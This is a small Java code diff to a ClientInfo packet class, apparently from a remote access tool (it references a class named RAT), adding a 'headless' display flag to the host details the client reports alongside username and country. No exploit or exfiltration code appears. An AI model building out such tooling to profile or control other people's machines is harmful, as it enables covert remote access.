@@ -1,5 +1,6 @@
 package electron.networking.packets;
 
+import java.awt.GraphicsEnvironment;
 import java.io.IOException;
 
 import org.json.simple.JSONObject;
@@ -47,6 +48,7 @@ public class ClientInfo {
 		out.put("username", username);
 		out.put("country", country);
 		out.put("native-image", String.valueOf(RAT.isNativeImage));
+		out.put("headless", GraphicsEnvironment.isHeadless());
 		return out;
 	}
 
